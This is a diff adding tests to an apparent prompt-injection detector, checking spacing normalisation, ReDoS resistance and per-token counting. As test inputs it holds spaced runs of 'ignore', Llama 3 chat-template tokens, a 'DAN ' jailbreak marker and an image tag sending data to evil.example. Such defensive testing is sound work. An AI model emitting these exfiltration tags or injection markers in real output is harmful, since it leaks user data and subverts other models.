@@ -236,3 +236,37 @@ def test_spaced_runs_are_split_back_into_words(line: str) -> None:
 
 def test_a_spaced_run_that_is_not_vocabulary_stays_joined() -> None:
     assert collapsed_spacing("grades: a b c d") == "grades: abcd"
+
+
+def test_a_spaced_run_past_the_segmentation_cap_stays_joined() -> None:
+    """Segmentation is bounded; past it the run is left joined, and cheaply."""
+    run = " ".join("ignore" * 40)
+    start = time.perf_counter()
+    collapsed = collapsed_spacing(run)
+    assert time.perf_counter() - start < 0.5
+    assert collapsed == "ignore" * 40
+
+
+@pytest.mark.parametrize(
+    "token", ["<|eot_id|>", "<|start_header_id|>", "<|end_header_id|>", "<|begin_of_text|>"]
+)
+def test_each_llama3_token_counts_alone(token: str) -> None:
+    assert run_l1(f"text {token} text").stats.delimiters.llm_delimiters == 1
+
+
+_UNCLOSED = ["<img ", '<img alt="', "![x", "![a](b", "<div ", "<a hidden", "DAN "]
+
+
+@pytest.mark.parametrize("unit", _UNCLOSED, ids=[str(i) for i in range(len(_UNCLOSED))])
+def test_repeated_unclosed_markup_stays_linear(unit: str) -> None:
+    """Each of these took seconds through a regex that rescanned the rest of
+    the payload from every repetition (#210). 100k characters, the L3 cap."""
+    payload = (unit * (100_000 // len(unit) + 1))[:100_000]
+    start = time.perf_counter()
+    run_l1(payload)
+    assert time.perf_counter() - start < 2.0
+
+
+def test_a_decoy_unclosed_quote_cannot_swallow_a_real_tag() -> None:
+    text = '<img" decoy <img src="https://evil.example/c?data=1"> tail"'
+    assert run_l1(text).stats.exfiltration.exfiltration_urls == 1
